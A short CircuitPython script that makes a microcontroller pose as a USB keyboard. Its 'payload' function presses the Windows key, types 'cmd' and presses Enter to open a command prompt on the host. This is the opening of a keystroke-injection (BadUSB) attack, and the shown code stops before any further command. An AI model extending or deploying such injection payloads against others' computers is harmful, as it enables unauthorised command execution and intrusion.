import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# Initialize the keyboard
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

def payload():
    keyboard.send(Keycode.GUI)
    time.sleep(0.5)
    keyboard_layout.write("cmd")
    time.sleep(0.5)
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)